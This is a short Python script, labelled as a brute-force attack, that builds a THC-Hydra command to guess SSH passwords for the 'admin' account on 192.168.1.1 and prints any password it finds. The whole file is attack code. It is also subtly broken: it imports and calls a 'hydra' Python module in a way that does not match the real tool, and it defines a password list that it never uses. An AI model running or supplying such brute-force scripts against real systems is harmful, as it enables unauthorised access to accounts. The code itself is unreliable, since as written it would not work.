import hydra


#  Brute force attek 
target = "192.168.1.1"
username = "admin"
passwords = ["password1", "password2", "password3"]

# Define the Hydra command to run
cmd = f"hydra -l {username} -P passwords.txt {target} ssh"

# Run the Hydra command
results = hydra.run(cmd)

# Print the results
for result in results:
    print(f"Password found: {result.password}")